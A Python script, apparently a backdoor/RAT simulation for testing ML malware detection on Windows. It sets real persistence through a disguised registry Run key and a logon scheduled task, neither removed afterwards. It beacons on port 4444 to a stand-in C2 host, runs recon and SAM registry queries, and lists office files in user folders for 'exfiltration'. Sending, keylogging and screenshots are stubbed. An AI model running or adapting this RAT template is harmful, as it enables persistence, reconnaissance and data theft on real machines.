#!/usr/bin/env python3
"""
Backdoor/RAT (Remote Access Trojan) Simulation
This simulates backdoor behavior for ML detection testing
"""

import os
import sys
import time
import socket
import threading
import subprocess
import base64
import winreg
from urllib.request import urlopen

class BackdoorMalware:
    def __init__(self):
        self.running = False
        self.c2_servers = [
            "malicious-c2.badactor.com",
            "127.0.0.1",  # localhost for testing
            "192.168.1.200"
        ]
        self.listen_port = 4444
        
    def install_backdoor(self):
        """Install backdoor with persistence"""
        try:
            # Copy to system directory
            system_path = os.path.join(os.getenv('WINDIR', 'C:\\Windows'), 'System32', 'svchost_update.exe')
            
            # Add to registry for persistence
            reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, system_path)
            winreg.CloseKey(key)
            
            # Create scheduled task
            task_cmd = f'schtasks /create /tn "SystemUpdater" /tr "{sys.executable}" /sc onlogon /f'
            subprocess.run(task_cmd, shell=True, capture_output=True)
            
        except Exception as e:
            print(f"Persistence setup failed: {e}")
    
    def reverse_shell_handler(self):
        """Simulate reverse shell connection"""
        while self.running:
            try:
                for server in self.c2_servers:
                    print(f"Attempting reverse connection to {server}:{self.listen_port}")
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    try:
                        # Simulate connection attempt
                        result = sock.connect_ex((server, self.listen_port))
                        if result == 0:
                            print(f"Connected to C2 server: {server}")
                            self.handle_commands(sock)
                    except:
                        pass
                    finally:
                        sock.close()
                        
                time.sleep(10)  # Wait before next connection attempt
            except:
                pass
    
    def handle_commands(self, sock):
        """Simulate handling commands from C2"""
        commands = [
            "whoami",
            "ipconfig",
            "systeminfo", 
            "tasklist",
            "net user",
            "dir C:\\",
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        ]
        
        for cmd in commands:
            try:
                print(f"Executing command: {cmd}")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                # Simulate sending result back to C2
                response = f"Command: {cmd}\nOutput: {result.stdout[:100]}...\n"
                # sock.send(response.encode())  # Don't actually send
                
                time.sleep(1)
            except:
                pass
    
    def keylogger_module(self):
        """Simulate keystroke logging"""
        fake_keystrokes = [
            "gmail.com",
            "password123",
            "admin@company.com",
            "confidential_document.pdf",
            "banking_login",
            "credit_card_info"
        ]
        
        log_file = os.path.join(os.getenv('TEMP'), 'kb_log.txt')
        
        while self.running:
            try:
                with open(log_file, 'a') as f:
                    for keystroke in fake_keystrokes:
                        f.write(f"{time.ctime()}: {keystroke}\n")
                        time.sleep(2)
            except:
                pass
            time.sleep(30)
    
    def file_exfiltration(self):
        """Simulate file theft"""
        target_files = [
            "*.doc", "*.docx", "*.pdf", "*.txt",
            "*.xls", "*.xlsx", "*.ppt", "*.pptx"
        ]
        
        search_paths = [
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Downloads")
        ]
        
        stolen_files = []
        
        for path in search_paths:
            if os.path.exists(path):
                try:
                    for root, dirs, files in os.walk(path):
                        for file in files[:5]:  # Limit to 5 files per directory
                            file_path = os.path.join(root, file)
                            if any(file.endswith(ext.replace('*', '')) for ext in target_files):
                                stolen_files.append(file_path)
                                print(f"Identified for exfiltration: {file_path}")
                except:
                    pass
        
        # Simulate uploading to C2
        for file_path in stolen_files[:10]:  # Limit to 10 files
            print(f"Uploading to C2: {os.path.basename(file_path)}")
            time.sleep(1)
    
    def screen_capture(self):
        """Simulate screen capture"""
        try:
            # Simulate taking screenshots
            for i in range(5):
                screenshot_path = os.path.join(os.getenv('TEMP'), f'screen_{i}.jpg')
                print(f"Capturing screen: {screenshot_path}")
                
                # Create fake screenshot file
                with open(screenshot_path, 'wb') as f:
                    f.write(b"FAKE_SCREENSHOT_DATA")
                
                time.sleep(3)
        except:
            pass
    
    def network_discovery(self):
        """Simulate network reconnaissance"""
        print("Starting network discovery...")
        
        # Simulate network scanning
        network_commands = [
            "arp -a",
            "netstat -an",
            "nslookup google.com",
            "ping 8.8.8.8",
            "tracert google.com"
        ]
        
        for cmd in network_commands:
            try:
                print(f"Network recon: {cmd}")
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            except:
                pass
            time.sleep(2)
    
    def privilege_escalation(self):
        """Simulate privilege escalation attempts"""
        escalation_commands = [
            "whoami /priv",
            "net localgroup administrators",
            "reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users",
            "wmic useraccount get name,sid"
        ]
        
        for cmd in escalation_commands:
            try:
                print(f"Privilege escalation attempt: {cmd}")
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            except:
                pass
            time.sleep(1)
    
    def start_backdoor(self):
        """Start the backdoor simulation"""
        print("=== BACKDOOR/RAT SIMULATION STARTING ===")
        print("WARNING: This is a simulation for testing ML detection!")
        
        self.running = True
        
        # Install persistence
        print("Installing backdoor persistence...")
        self.install_backdoor()
        
        # Start malicious modules
        modules = [
            threading.Thread(target=self.reverse_shell_handler),
            threading.Thread(target=self.keylogger_module),
            threading.Thread(target=self.file_exfiltration),
            threading.Thread(target=self.screen_capture),
            threading.Thread(target=self.network_discovery),
            threading.Thread(target=self.privilege_escalation)
        ]
        
        for module in modules:
            module.daemon = True
            module.start()
            time.sleep(1)
        
        # Run for 30 seconds
        print("Backdoor modules active...")
        time.sleep(30)
        
        self.running = False
        print("Backdoor simulation complete.")

if __name__ == "__main__":
    try:
        backdoor = BackdoorMalware()
        backdoor.start_backdoor()
    except Exception as e:
        print(f"Backdoor simulation failed: {e}")
    
    print("Simulation ended.")
